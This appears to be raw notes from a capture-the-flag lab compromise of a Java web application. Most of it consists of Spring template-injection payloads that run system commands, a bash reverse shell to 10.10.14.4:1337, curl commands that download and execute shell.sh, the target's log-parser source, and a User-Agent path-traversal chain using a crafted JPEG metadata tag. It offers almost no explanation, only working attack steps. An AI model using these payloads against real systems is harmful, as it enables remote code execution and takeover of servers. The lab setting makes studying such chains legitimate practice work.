class.getResource("../../../../../index.htm").getContent()

T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('bash%20-i%20>&%20/dev/tcp/10.10.14.4/1337%200>&1').getInputStream())}

shell.sh
bash -i >& /dev/tcp/10.10.14.4/1337 0>&1

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.4:8000/shell.sh -o /tmp/shell.sh').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('/bin/bash /tmp/shell.sh').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.4:8000/shell.sh -o /tmp/shell.sh').getInputStream())}

*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('chmod +x /tmp/shell.sh').getInputStream())}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('/bin/bash /tmp/shell.sh').getInputStream())}

/opt/creditscore/LogParser/final/src/main/java/com/logparser/App.java


public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image") 
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}

curl -A "evil||/../../../../../../../../../../../tmp/smooch.jpg" http://10.129.227.207:8080/

wget 10.129.227.207:8080/img/smooch.jpg
./exiftool -Artist smooch.jpg

wget 10.10.14.4:8000/smooch.jpg
curl -A "evil||/../../../../../../../../../../tmp/smooch.jpg" http://10.129.227.207:8080/
